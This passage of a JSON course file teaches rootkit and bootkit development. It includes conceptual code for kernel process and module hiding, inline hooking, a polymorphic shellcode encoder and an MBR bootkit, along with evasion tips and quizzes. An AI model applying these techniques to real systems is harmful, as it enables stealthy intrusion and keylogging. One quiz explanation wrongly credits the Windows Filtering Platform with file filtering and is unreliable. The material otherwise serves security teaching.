                            "title": "Windows Kernel Driver Development",
                            "content": "<p>A kernel-mode rootkit on Windows is a kernel driver. Developing a driver requires the Windows Driver Kit (WDK) and a deep understanding of C/C++ and kernel-specific APIs. Unlike a user-mode program, a bug in a kernel driver (like a null pointer dereference) will not just crash the program; it will crash the entire operating system, resulting in a Blue Screen of Death (BSOD).</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "IRP Hooking and Filtering",
                            "content": "<p>SSDT hooking is an old technique and is now heavily protected by kernel security features like PatchGuard. The more modern way to intercept I/O is to use a **filter driver**.</p><p>Windows uses a layered driver model. When a request is made (e.g., to open a file), an I/O Request Packet (IRP) is created and passed down a stack of driver objects. A filter driver is a special type of driver that can attach itself to this stack. It can then intercept, view, modify, or block any IRP that passes through it.</p><p><strong>Real-world Example: File system filter driver.</strong> An attacker can write a file system filter driver that attaches itself above the main file system driver. It can then intercept all IRPs for file operations. If it sees a request to open or list a file named `malware.exe`, it can simply complete the request with a 'File Not Found' error, effectively hiding the file from the entire system in a way that is much stealthier and more stable than SSDT hooking.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Direct Kernel Object Manipulation (DKOM)",
                            "content": "<p>DKOM is a technique for hiding by directly modifying the kernel's internal data structures in memory. The most classic example is process hiding.</p><h3>Process Hiding with DKOM:</h3><p>The kernel maintains a circular, doubly-linked list of all active processes via the `ActiveProcessLinks` member of the `EPROCESS` structure. A tool like Task Manager gets its process list by effectively asking the kernel to walk this list. A DKOM rootkit can hide its process by doing the following:</p><ol><li>Find the `EPROCESS` block for its own process in kernel memory.</li><li>Find the `EPROCESS` blocks for the previous and next processes in the list.</li><li>Modify the `Flink` (forward link) of the previous process to point to the next process.</li><li>Modify the `Blink` (backward link) of the next process to point to the previous process.</li></ol><p>This effectively 'unlinks' the malicious process from the list. The process is still running and fully functional, but it is now completely invisible to any tool that relies on the standard process list.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Process Hiding via DKOM (Conceptual C++)",
                            "language": "cpp",
                            "code": "// This is a highly conceptual C++ snippet for a Windows kernel driver\n// demonstrating the logic of unlinking a process to hide it.\n\n#include <ntddk.h>\n\nVOID HideProcess(PEPROCESS targetProcess) {\n    // The EPROCESS structure contains the ActiveProcessLinks member, which is a LIST_ENTRY.\n    // The offset of this member is specific to the Windows version and must be found.\n    ULONG activeProcessLinksOffset = GetActiveProcessLinksOffset();\n\n    // Get a pointer to the LIST_ENTRY within the target EPROCESS block\n    PLIST_ENTRY pLinks = (PLIST_ENTRY)((PUCHAR)targetProcess + activeProcessLinksOffset);\n\n    // The Flink points to the next process's LIST_ENTRY\n    // The Blink points to the previous process's LIST_ENTRY\n    PLIST_ENTRY pPrevious = pLinks->Blink;\n    PLIST_ENTRY pNext = pLinks->Flink;\n\n    // To unlink: Point the previous entry's Flink to the next entry.\n    //            Point the next entry's Blink to the previous entry.\n    pPrevious->Flink = pNext;\n    pNext->Blink = pPrevious;\n\n    // The targetProcess is now unlinked from the active process list and will be\n    // invisible to Task Manager and other standard tools.\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A bug in a Windows kernel driver is likely to cause what?",
                            "options": [
                                "The driver will stop working, but the OS will be fine.",
                                "A Blue Screen of Death (BSOD) that crashes the entire operating system.",
                                "A warning message in the event log.",
                                "The driver will be automatically uninstalled."
                            ],
                            "correct": 1,
                            "explanation": "Because drivers run in Ring 0, they have direct access to critical system resources. An unhandled error in a kernel driver almost always leads to a full system crash (a BSOD)."
                        },
                        {
                            "id": 2,
                            "question": "A modern, stealthy Windows rootkit that wants to intercept and hide file access would most likely use which technique?",
                            "options": [
                                "SSDT Hooking",
                                "A file system filter driver that intercepts IRPs",
                                "DLL Injection",
                                "Process Hollowing"
                            ],
                            "correct": 1,
                            "explanation": "SSDT hooking is largely obsolete due to PatchGuard. The modern, supported, and much stealthier way to intercept I/O is to use the Windows Filtering Platform and write a filter driver that can legitimately attach to the driver stack."
                        },
                        {
                            "id": 3,
                            "question": "The rootkit technique of directly modifying the `ActiveProcessLinks` in the `EPROCESS` structure to hide a process is an example of:",
                            "options": [
                                "SSDT Hooking",
                                "IRP Hooking",
                                "Direct Kernel Object Manipulation (DKOM)",
                                "API Hooking"
                            ],
                            "correct": 2,
                            "explanation": "DKOM is the name for any technique that directly modifies the kernel's internal data structures. Unlinking a process from the active list is the most classic example of a DKOM-based attack."
                        }
                    ]
                }
            },
            {
                "id": "lesson-6",
                "title": "Kernel-Mode Rootkits - Linux",
                "duration": "120 min",
                "objectives": [
                    "Develop and compile a basic Loadable Kernel Module (LKM).",
                    "Implement a rootkit by hooking the system call table.",
                    "Use Netfilter hooks to intercept and modify network traffic.",
                    "Manipulate kernel symbols to achieve stealth.",
                    "Develop a module that can hide itself from `lsmod`."
                ],
                "content": {
                    "overview": "This lesson transitions to the Linux kernel, exploring the development of rootkits via Loadable Kernel Modules (LKMs). We will cover the classic technique of hooking the system call table, learn how to intercept network traffic with Netfilter, and implement the DKOM equivalent of module hiding to make our rootkit invisible.",
                    "sections": [
                        {
                            "title": "Loadable Kernel Module (LKM) Development",
                            "content": "<p>A Linux kernel-mode rootkit is an LKM. An LKM is a piece of code that can be dynamically loaded into the running kernel. This is the standard way to add device drivers and other features to Linux, and it is the mechanism that attackers abuse.</p><p>Developing an LKM requires an understanding of C, the kernel source code, and how to compile against the kernel headers for a specific version. A bug in an LKM will cause a 'kernel panic', which is the Linux equivalent of a BSOD.</p>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "System Call Hooking Methods",
                            "content": "<p>The classic Linux rootkit hooks the `sys_call_table`. This is an array of function pointers that holds the address of every system call handler. By overwriting a pointer in this table, a rootkit can redirect a system call to its own malicious function.</p><p><strong>The Challenge:</strong> The address of the `sys_call_table` is not exported by the kernel, so a rootkit must find it dynamically. Also, on modern CPUs, the memory page containing the table is marked as read-only. The rootkit must first disable this write protection, overwrite the pointer, and then re-enable write protection to avoid crashing the system.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Module Hiding Techniques",
                            "content": "<p>When an LKM is loaded with `insmod`, the kernel adds it to a doubly-linked list of all loaded modules. The `lsmod` command simply reads and displays this list. A stealthy rootkit must hide itself from `lsmod`.</p><p><strong>Real-world Example: Module list manipulation.</strong> In the rootkit's initialization code, after it has successfully installed its hooks, it performs a DKOM attack. It gets a pointer to its own `struct module` in the linked list. It then carefully modifies the `next` and `prev` pointers of the surrounding modules to unlink itself from the list. The rootkit's code is still loaded and running in the kernel, but because it is no longer in the list, it is completely invisible to `lsmod` and any other tool that relies on that standard list.</p>",
                            "image": "https://images.unsplash.com/photo-1550745165-9bc0b252726a?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Netfilter Packet Interception (LKM)",
                            "language": "c",
                            "code": "#include <linux/kernel.h>\n#include <linux/module.h>\n#include <linux/netfilter.h>\n#include <linux/netfilter_ipv4.h>\n\n// This is a conceptual LKM that uses Netfilter to intercept network packets.\n\n// Define the hook function that will be called for each packet.\nstatic unsigned int packet_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {\n    struct iphdr *iph;\n\n    if (!skb) {\n        return NF_ACCEPT; // Allow the packet to continue\n    }\n\n    iph = ip_hdr(skb);\n\n    // --- Malicious Logic ---\n    // For example, if the destination port is 22 (SSH), drop the packet.\n    if (iph->protocol == IPPROTO_TCP) {\n        struct tcphdr *tcph = tcp_hdr(skb);\n        if (ntohs(tcph->dest) == 22) {\n            printk(KERN_INFO \"Dropping outbound SSH packet!\\n\");\n            return NF_DROP; // Drop the packet\n        }\n    }\n\n    return NF_ACCEPT; // Accept all other packets\n}\n\n// Define the hook operation\nstatic struct nf_hook_ops netfilter_ops = {\n    .hook = packet_hook_func,\n    .pf = PF_INET,\n    .hooknum = NF_INET_PRE_ROUTING,\n    .priority = NF_IP_PRI_FIRST\n};\n\nstatic int __init start_hook(void) {\n    nf_register_net_hook(&init_net, &netfilter_ops);\n    return 0;\n}\n\nstatic void __exit stop_hook(void) {\n    nf_unregister_net_hook(&init_net, &netfilter_ops);\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The primary mechanism for writing a kernel-mode rootkit on Linux is by creating a:",
                            "options": [
                                "DLL",
                                "Systemd service",
                                "Loadable Kernel Module (LKM)",
                                "Bash script"
                            ],
                            "correct": 2,
                            "explanation": "LKMs are the official, supported way to dynamically extend the Linux kernel's functionality. This same mechanism is abused by attackers to load their malicious code directly into the kernel."
                        },
                        {
                            "id": 2,
                            "question": "The Linux kernel's array of function pointers that holds the addresses of all system call handlers is known as the:",
                            "options": [
                                "SSDT",
                                "`sys_call_table`",
                                "GOT",
                                "VFS"
                            ],
                            "correct": 1,
                            "explanation": "The `sys_call_table` is the Linux equivalent of the SSDT on Windows. Overwriting pointers in this table is the classic method for a Linux rootkit to hook system calls."
                        },
                        {
                            "id": 3,
                            "question": "The framework within the Linux kernel that allows for the interception and manipulation of network packets, often used by firewalls and rootkits, is known as:",
                            "options": [
                                "SELinux",
                                "VFS",
                                "Netfilter",
                                "Systemd"
                            ],
                            "correct": 2,
                            "explanation": "Netfilter is the core packet filtering framework in the Linux kernel. A rootkit can register a 'netfilter hook' to gain the ability to inspect, modify, or drop any packet that passes through the system."
                        }
                    ]
                }
            },
            {
                "id": "lesson-7",
                "title": "Advanced Hooking Techniques",
                "duration": "100 min",
                "objectives": [
                    "Implement inline function hooking (detours).",
                    "Use hardware breakpoints and debug registers for hooking.",
                    "Manipulate the SYSENTER/SYSCALL mechanism.",
                    "Understand and hook the Interrupt Descriptor Table (IDT)."
                ],
                "content": {
                    "overview": "This lesson explores advanced and often stealthier methods for intercepting code execution. We will move beyond modifying tables of pointers to the art of directly patching code in memory with 'inline hooks', and even using the CPU's own debugging hardware to create undetectable breakpoints.",
                    "sections": [
                        {
                            "title": "Inline Function Hooking (Detours)",
                            "content": "<p>Inline hooking is a powerful technique where you modify the very first few bytes of the target function in memory.</p><h3>The Process:</h3><ol><li>The rootkit finds the target function in memory (e.g., `NtCreateFile`).</li><li>It overwrites the first 5 bytes of the function with a `JMP` instruction that points to its own malicious hook function.</li><li>The rootkit saves the 5 bytes it just overwrote.</li></ol><p>Now, whenever the function is called, the CPU immediately hits the `JMP` and is redirected to the rootkit's code. The rootkit's hook function includes a special 'trampoline' that will execute the 5 original bytes it saved and then jump back into the original function right after the hook, allowing the legitimate function to run normally after the rootkit has done its work. This is much stealthier than modifying a well-known table like the SSDT.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hardware Breakpoint Hooking",
                            "content": "<p>This is one of the stealthiest hooking methods possible. Modern CPUs have a small number of special 'debug registers'. A programmer can write the address of an instruction into a debug register. When the CPU's instruction pointer (EIP) hits that address, it will automatically trigger a debug exception without any modification to the code itself.</p><p>A rootkit can install its own exception handler and then set a hardware breakpoint on the first instruction of a target kernel function. When the function is called, the rootkit's exception handler is triggered, giving it control. This is almost impossible for other software to detect, as the code in the target function is never modified.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "IDT (Interrupt Descriptor Table) Manipulation",
                            "content": "<p>The IDT is the table the CPU uses to find the handler for a specific interrupt or exception (e.g., a keypress, a page fault, or a system call).</p><p><strong>Real-world Example: Keystroke Logger.</strong> A rootkit wants to log all keystrokes. It can hook the IDT entry for the keyboard interrupt. Now, every single time a key is pressed, the rootkit's code is executed *before* the operating system's normal keyboard handler. The rootkit can record the key that was pressed and then pass the interrupt along to the legitimate handler so the user notices nothing. This allows the rootkit to capture every single thing the user types, from passwords to emails, at the lowest possible level.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Inline Hook Implementation (Conceptual)",
                            "language": "c",
                            "code": "// Conceptual C++ code for an inline hook (detour).\n\n// 1. Define the address of the target function.\nBYTE* targetAddress = (BYTE*)GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"CreateFileW\");\n\n// 2. Define our hook function.\nvoid HookedCreateFileW(...) { ... }\n\n// 3. Construct the JMP instruction.\n//    The structure is: 0xE9 (JMP opcode) followed by a 32-bit relative offset.\nBYTE jmpInstruction[5];\njmpInstruction[0] = 0xE9;\nDWORD relativeOffset = (DWORD)HookedCreateFileW - (DWORD)targetAddress - 5;\nmemcpy(&jmpInstruction[1], &relativeOffset, 4);\n\n// 4. Save the original 5 bytes of the target function.\nBYTE originalBytes[5];\nmemcpy(originalBytes, targetAddress, 5);\n\n// 5. Overwrite the beginning of the target function with our JMP.\n//    (This requires changing memory protections first).\n// WriteProcessMemory(..., targetAddress, jmpInstruction, 5, ...);\n\n// Now any call to CreateFileW will be redirected to our hook function."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A hooking technique that works by overwriting the first few bytes of a target function in memory with a `JMP` instruction is known as:",
                            "options": [
                                "SSDT Hooking",
                                "Inline Hooking (Detours)",
                                "IRP Hooking",
                                "DKOM"
                            ],
                            "correct": 1,
                            "explanation": "Inline hooking directly patches the executable code of the target function, making it a very powerful but also delicate hooking technique. It is often harder to detect than simple table modification."
                        },
                        {
                            "id": 2,
                            "question": "What makes hooking via hardware breakpoints so stealthy?",
                            "options": [
                                "It is easy to implement.",
                                "It does not modify any of the target's code or data structures in memory; it uses the CPU's own debugging hardware to trigger the hook.",
                                "It is the fastest type of hook.",
                                "It is not stealthy at all."
                            ],
                            "correct": 1,
                            "explanation": "Because the code itself is never touched, it is almost impossible for another piece of software to detect that a hardware breakpoint hook is in place. The only limitation is the very small number of debug registers available."
                        },
                        {
                            "id": 3,
                            "question": "A rootkit that wants to log every keystroke a user types would most likely hook which kernel structure?",
                            "options": [
                                "The SSDT",
                                "The process list",
                                "The Interrupt Descriptor Table (IDT), specifically the entry for the keyboard interrupt.",
                                "The file system"
                            ],
                            "correct": 2,
                            "explanation": "The IDT is the lowest-level mechanism for handling hardware events. By hooking the keyboard interrupt, the rootkit can gain control every single time a key is pressed, before the OS even knows about it."
                        }
                    ]
                }
            },
            {
                "id": "lesson-8",
                "title": "Stealth and Anti-Detection Mechanisms",
                "duration": "100 min",
                "objectives": [
                    "Implement common anti-debugging techniques.",
                    "Develop methods to detect virtual machine and sandbox environments.",
                    "Apply code obfuscation to make static analysis more difficult.",
                    "Generate polymorphic and metamorphic code to evade signatures.",
                    "Use timing-based attacks to evade automated analysis."
                ],
                "content": {
                    "overview": "This lesson focuses on the cat-and-mouse game of evasion. We will explore the techniques that malware and rootkits use to detect and thwart analysis, from simple anti-debugging tricks to the advanced code transformations of polymorphic and metamorphic engines. Understanding these techniques is crucial for both writing stealthy code and for defeating it.",
                    "sections": [
                        {
                            "title": "Anti-Debugging and Anti-Virtual Machine Detection",
                            "content": "<p>Malware often includes checks to see if it is being analyzed. If it detects a debugger or a VM, it will alter its behavior or refuse to run altogether.</p><h3>Common Checks:</h3><ul><li><strong>API Checks:</strong> Calling the `IsDebuggerPresent()` Windows API.</li><li><strong>Timing Checks:</strong> A piece of code that should take a long time to run (e.g., a complex calculation) will execute almost instantly in some sandboxes that try to accelerate time. The malware can measure the execution time to detect this.</li><li><strong>VM Artifacts:</strong> Checking for the existence of files, registry keys, or MAC addresses that are specific to VMware or VirtualBox.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Polymorphic and Metamorphic Code",
                            "content": "<p>These techniques are designed to ensure that no two copies of the malware look the same on disk, defeating signature-based antivirus.</p><ul><li><strong>Polymorphism:</strong> The malware's main body is encrypted with a different key for each infection. A small, unique decryptor stub is generated each time. The malware's functionality is static, but its on-disk representation is always different.</li><li><strong>Metamorphism:</strong> The most advanced technique. A metamorphic engine completely rewrites the malware's code with each infection. It might reorder functions, insert junk code, and replace instructions with equivalent ones. The new version is functionally identical but syntactically unique.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Stealth Communication Channels",
                            "content": "<p>Rootkits must communicate with their C2 server without being detected by network security tools.</p><p><strong>Real-world Example: Timing-based detection evasion.</strong> A rootkit needs to send a beacon to its C2 server. Instead of sending it at a highly regular, machine-like interval (which is easy to detect), the rootkit's author analyzes the victim's normal web browsing traffic. They find that the user browses to a news site about every 15 minutes. The rootkit then mimics this behavior, sending its C2 beacon with a randomized jitter of around 15 minutes. This makes the malicious traffic blend in with the user's legitimate traffic, making it much harder for a behavioral network analysis tool to spot as an anomaly.</p>",
                            "image": "https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Polymorphic Code Engine (Conceptual)",
                            "language": "python",
                            "code": "import random\n\n# This conceptual script demonstrates the logic of a simple polymorphic encoder.\n\ndef polymorphic_xor_encoder(shellcode):\n    \"\"\"Encodes a payload with a random XOR key and generates a unique decoder.\"\"\"\n    \n    # 1. Generate a random, single-byte XOR key.\n    #    Crucially, ensure the key itself is not a 'bad character' like a null byte.\n    key = random.randint(1, 255)\n\n    # 2. XOR the original shellcode with the key.\n    encoded_shellcode = bytes([b ^ key for b in shellcode])\n\n    # 3. Dynamically generate the assembly code for the decoder stub.\n    #    This stub will get the key, find the encoded payload, and loop through it,\n    #    XORing each byte back to its original form.\n    decoder_stub_asm = f\"\"\"\n        mov al, {hex(key)}       ; Load the key\n        lea rdi, [rel payload]   ; Load address of the payload\n        mov ecx, {len(shellcode)} ; Set up the loop counter\n    decode_loop:\n        xor byte [rdi], al       ; XOR the byte\n        inc rdi                  ; Move to the next byte\n        loop decode_loop         ; Loop\n    payload:\n    \"\"\"\n    # 4. Assemble the decoder stub and append the encoded shellcode.\n    # final_payload = assemble(decoder_stub_asm) + encoded_shellcode\n    # return final_payload"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A piece of malware that checks the MAC address of the network card to see if it belongs to VMware or VirtualBox is performing what kind of check?",
                            "options": [
                                "Anti-debugging",
                                "Anti-virtual machine",
                                "Code obfuscation",
                                "A timing attack"
                            ],
                            "correct": 1,
                            "explanation": "This is a classic anti-VM or anti-sandbox technique. The malware is checking for artifacts of the virtual environment to determine if it is being analyzed."
                        },
                        {
                            "id": 2,
                            "question": "Malware that completely rewrites its own code with each new infection, while preserving its original functionality, is known as:",
                            "options": [
                                "Polymorphic",
                                "Metamorphic",
                                "Encrypted",
                                "Packed"
                            ],
                            "correct": 1,
                            "explanation": "Metamorphism is the most advanced form of code transformation. Unlike polymorphism, which just re-encrypts a static payload, a metamorphic engine is a full-blown compiler that regenerates the entire program from scratch for each infection."
                        },
                        {
                            "id": 3,
                            "question": "The Windows API function `IsDebuggerPresent()` is used by malware for what purpose?",
                            "options": [
                                "To crash the computer.",
                                "To perform an anti-debugging check.",
                                "To connect to the internet.",
                                "To encrypt files."
                            ],
                            "correct": 1,
                            "explanation": "This is the simplest and most common anti-debugging trick. The malware calls this function, and if it returns true, the malware knows it is being run inside a debugger and can alter its behavior or exit."
                        }
                    ]
                }
            },
            {
                "id": "lesson-9",
                "title": "UEFI and Bootkit Fundamentals",
                "duration": "120 min",
                "objectives": [
                    "Understand the modern UEFI boot process and its architecture.",
                    "Analyze the components of the UEFI firmware.",
                    "Learn the basics of UEFI application and driver development.",
                    "Deconstruct the Secure Boot mechanism and its chain of trust.",
                    "Analyze how boot integrity is verified and where it can be attacked."
                ],
                "content": {
                    "overview": "Before the operating system can be subverted, it must first be loaded. This lesson introduces the world of bootkits, the malware that infects the pre-boot environment. We will explore the modern UEFI architecture that has replaced the legacy BIOS and analyze the Secure Boot process that is designed to defend it.",
                    "sections": [
                        {
                            "title": "UEFI Architecture Overview",
                            "content": "<p>The Unified Extensible Firmware Interface (UEFI) is a modern replacement for the legacy BIOS. It is essentially a small, self-contained operating system that runs when the computer is first powered on. Its primary job is to initialize the hardware and then load the main operating system.</p><h3>Phases of the UEFI Boot Process:</h3><ol><li><strong>SEC (Security):</strong> The initial code that runs on the CPU.</li><li><strong>PEI (Pre-EFI Initialization):</strong> Initializes the core system hardware.</li><li><strong>DXE (Driver Execution Environment):</strong> The main phase, where UEFI drivers for various hardware are loaded and executed.</li><li><strong>BDS (Boot Device Select):</strong> The phase where the boot device is chosen and the OS bootloader is executed.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "UEFI Application and Driver Development",
                            "content": "<p>UEFI has its own application format (PE/COFF, the same as Windows) and its own well-defined API. It is possible to write your own UEFI applications and drivers using a framework like EDK II. This is the same process that a bootkit author uses. A UEFI bootkit is just a malicious UEFI driver that is loaded during the DXE phase.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Secure Boot Mechanisms",
                            "content": "<p>Secure Boot is a feature of UEFI designed to prevent bootkits. It works by creating a cryptographic chain of trust.</p><p><strong>Real-world Example: The Secure Boot Chain of Trust.</strong></p><ol><li>The UEFI firmware itself contains a set of embedded public keys (the 'Platform Key' from the manufacturer, and keys from Microsoft).</li><li>When the system boots, the firmware checks the digital signature of the OS bootloader. It will only execute the bootloader if it has been signed by a trusted key (e.g., Microsoft's key).</li><li>The Windows bootloader then checks the signature of the kernel (`ntoskrnl.exe`).</li><li>The kernel then enforces that all loaded drivers must also be digitally signed by a trusted authority.</li></ol><p>This chain of trust is designed to ensure that from the moment the power is turned on, only trusted, signed code is ever executed. A standard bootkit will fail to load because it is not properly signed, and the Secure Boot process will halt.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "UEFI Application Creation (C)",
                            "language": "c",
                            "code": "// This is a simple 'Hello World' UEFI application written in C.\n// It is compiled using the EDK II build system.\n\n#include <Uefi.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n\n// The entry point for a UEFI application\nEFI_STATUS\nEFIAPI\nUefiMain (\n  IN EFI_HANDLE        ImageHandle,\n  IN EFI_SYSTEM_TABLE  *SystemTable\n  )\n{\n  // Use the UEFI console output protocol to print a message to the screen.\n  Print(L\"Hello, UEFI world!\\n\");\n\n  // Wait for a key press before exiting.\n  EFI_INPUT_KEY Key;\n  gST->ConIn->ReadKeyStroke(gST->ConIn, &Key);\n\n  return EFI_SUCCESS;\n}\n\n// An attacker would use this same framework to write a malicious bootkit.\n// Instead of printing 'Hello World', their code would hook UEFI runtime services\n// or patch the OS bootloader in memory before it executes."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the modern firmware interface that has replaced the legacy BIOS on most computers?",
                            "options": [
                                "DOS",
                                "UEFI (Unified Extensible Firmware Interface)",
                                "MBR",
                                "GPT"
                            ],
                            "correct": 1,
                            "explanation": "UEFI is essentially a small, modern operating system that runs before the main OS, and it is the primary target for modern bootkits."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary purpose of the Secure Boot feature in UEFI?",
                            "options": [
                                "To make the computer boot faster.",
                                "To ensure that only cryptographically signed and trusted code (bootloaders, kernels, drivers) is executed during the boot process, to prevent bootkits.",
                                "To allow users to choose which OS to boot.",
                                "To encrypt the hard drive."
                            ],
                            "correct": 1,
                            "explanation": "Secure Boot is a defense-in-depth mechanism specifically designed to defeat bootkits by creating a cryptographic chain of trust from the firmware up to the operating system."
                        },
                        {
                            "id": 3,
                            "question": "A UEFI rootkit is typically implemented as what?",
                            "options": [
                                "A user-mode application.",
                                "A malicious UEFI driver that is loaded during the DXE (Driver Execution Environment) phase.",
                                "A bash script.",
                                "A registry key."
                            ],
                            "correct": 1,
                            "explanation": "The DXE phase is where the UEFI firmware loads drivers for all the hardware. An attacker can create their own malicious driver and use various techniques to get it loaded during this phase, giving them control of the system before the OS even starts."
                        }
                    ]
                }
            },
            {
                "id": "lesson-10",
                "title": "Master Boot Record (MBR) Bootkits",
                "duration": "100 min",
                "objectives": [
                    "Understand the structure of the MBR and the legacy boot process.",
                    "Develop a simple MBR bootkit in assembly.",
                    "Analyze and reverse engineer MBR infection techniques.",
                    "Implement a boot sector manipulation payload.",
                    "Understand the challenges of real-mode programming."
                ],
                "content": {
                    "overview": "Before UEFI, the legacy BIOS ruled the boot process. This lesson goes back in time to explore the classic art of MBR bootkit development. We will learn how to infect the Master Boot Record, the very first sector of a hard drive, to gain execution before any other software on the system. While less common today, understanding MBR bootkits provides a crucial historical context and foundation for more modern techniques.",
                    "sections": [
                        {
                            "title": "MBR Structure and Boot Process",
                            "content": "<p>On a legacy BIOS system, after the Power-On Self-Test (POST), the BIOS reads the first 512-byte sector of the primary hard disk—the MBR—into memory at address `0x7C00` and then jumps to it.</p><h3>The MBR has three parts:</h3><ol><li><strong>Boot Code (446 bytes):</strong> The small program that is responsible for finding the active partition and loading its boot sector.</li><li><strong>Partition Table (64 bytes):</strong> Defines the primary partitions on the disk.</li><li><strong>Boot Signature (2 bytes):</strong> Must be `0x55AA`. The BIOS checks this signature to validate that it's a bootable disk.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "MBR Infection Techniques",
                            "content": "<p>An MBR bootkit works by overwriting the legitimate boot code in the MBR with its own malicious code.</p><h3>The Infection Process:</h3><ol><li>The bootkit first saves a copy of the original MBR to another, unused sector on the disk.</li><li>It then overwrites the MBR with its own code.</li><li>When the computer boots, the BIOS loads and runs the bootkit's code from the MBR.</li><li>The bootkit's code can now perform its malicious actions (e.g., hook interrupts to prepare to infect the OS kernel).</li><li>To avoid suspicion, the bootkit then loads the *original* MBR that it saved, and jumps to it, allowing the normal boot process to continue. The user sees nothing unusual.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Real-Mode Programming",
                            "content": "<p>The code in the MBR runs in 'real mode'. This is a 16-bit execution mode of the x86 CPU that is a throwback to the original IBM PC. It has no memory protection and a very limited, segmented memory model. Writing a bootkit requires an understanding of this archaic but powerful environment.</p><p><strong>Real-time Problem: MBR infection demonstration.</strong> A researcher wants to test their MBR bootkit. They write the 446 bytes of their bootkit in assembly. They then use a tool like `dd` to write their bootkit code directly to the first sector of a virtual hard disk file attached to a QEMU virtual machine. They start the VM. Instead of booting the OS, the VM prints the message from their bootkit, proving that their MBR infection was successful and they have achieved code execution at the earliest possible stage of the boot process.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "MBR Bootkit Implementation (Assembly)",
                            "language": "c",
                            "code": "// This is a very simple MBR bootkit written in 16-bit x86 assembly (NASM syntax).\n// Its only job is to print a message to the screen.\n\norg 0x7C00      ; The BIOS loads the MBR to this memory address.\n\nstart:\n    mov si, msg   ; SI now points to our message string.\n    call print_string\n\n    jmp $         ; Infinite loop to hang the system.\n\nprint_string:\n    mov ah, 0x0E  ; BIOS teletype output function.\n.loop:\n    lodsb         ; Load the next byte from SI into AL.\n    cmp al, 0     ; Check if it's the null terminator.\n    je .done      ; If so, we're done.\n    int 0x10      ; Otherwise, call the BIOS video interrupt to print the character.\n    jmp .loop\n.done:\n    ret\n\nmsg db 'Your MBR has been pwned!', 0\n\ntimes 510-($-$$) db 0  ; Pad the rest of the MBR with zeros.\ndw 0xAA55             ; The mandatory boot signature."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "On a legacy BIOS system, which sector of the hard disk does the BIOS load and execute to start the boot process?",
                            "options": [
                                "The last sector.",
                                "A random sector.",
                                "The first 512-byte sector (the Master Boot Record).",
                                "The boot sector of the active partition."
                            ],
                            "correct": 2,
                            "explanation": "The MBR is the very first sector and the starting point for the entire legacy boot process. Control of the MBR is control of the machine."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary goal of an MBR bootkit?",
                            "options": [
                                "To encrypt the hard drive.",
                                "To overwrite the legitimate boot code in the MBR with its own malicious code to gain execution before the operating system.",
                                "To delete the partition table.",
                                "To format the hard drive."
                            ],
                            "correct": 1,
                            "explanation": "By infecting the MBR, the bootkit ensures that it is the very first software to run when the computer is turned on, giving it ultimate control over the subsequent OS loading process."
                        },
                        {
                            "id": 3,
                            "question": "The CPU execution mode used by the code in the MBR, which is a throwback to the original 16-bit IBM PC, is known as:",
                            "options": [
                                "Protected Mode",
                                "Long Mode",
                                "Real Mode",
                                "Supervisor Mode"
                            ],
                            "correct": 2,
                            "explanation": "Real mode is the 16-bit legacy mode of x86 CPUs. It has no memory protection, which makes it a very powerful but also dangerous environment to program in. All MBR boot code must be written for real mode."
                        }
                    ]
                }
            },
            {
                "id": "lesson-11",
